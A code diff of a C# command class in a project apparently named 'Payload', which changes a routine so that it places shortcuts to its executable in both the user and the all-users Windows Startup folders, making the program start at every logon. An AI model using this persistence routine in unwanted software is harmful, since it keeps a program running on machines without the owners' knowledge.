@@ -8,13 +8,15 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using Payload.Common;
 
-namespace Payload.Core.Command.Demo
+namespace Payload.Core.Command
 {
     public class StartupSetupCommand : Payload.Command.Interface.ICommand
     {
 
-        string startUpFolderPath =
-              Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup);
+        string CommonStartupPath =
+            Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup);
+        string StartupPath =
+            Environment.GetFolderPath(Environment.SpecialFolder.Startup);
         public override Task Execute()
         {
             try
@@ -28,14 +30,29 @@ namespace Payload.Core.Command.Demo
         private void Setup()
         {
             DesktopUtility desktopUtility = new DesktopUtility();
-            string localShortcutName = $"{Config.Instance.ExeFullName}.lnk";
+
+            string localShortcutName = $"{Config.Instance.ExeName}.lnk";
+
+            string commonShortcutName = $"{CommonStartupPath}\\{localShortcutName}";
+            string shortcutName = $"{StartupPath}\\{localShortcutName}";
+
             if (File.Exists(localShortcutName))
                 File.Delete(localShortcutName);
-            desktopUtility.CreateShortcut(Config.Instance.ExeFullName, Config.Instance.ExeFullName);
-            string shortcutName = $"{startUpFolderPath}\\{Config.Instance.ExeName}";
-            if(File.Exists(shortcutName))
+            if (File.Exists(commonShortcutName))
+                File.Delete(commonShortcutName);
+            if (File.Exists(shortcutName))
                 File.Delete(shortcutName);
-            File.Copy(Config.Instance.ExeFullName + ".lnk", shortcutName);
+
+            desktopUtility.CreateShortcut(commonShortcutName);
+            desktopUtility.CreateShortcut(shortcutName);
+
+            string commonExe = $"{CommonStartupPath}\\{Config.Instance.ExeName}";
+            if (File.Exists(commonExe))
+                File.Delete(commonExe);
+
+            string exe = $"{StartupPath}\\{Config.Instance.ExeName}";
+            if (File.Exists(exe))
+                File.Delete(exe);
         }
 
     }
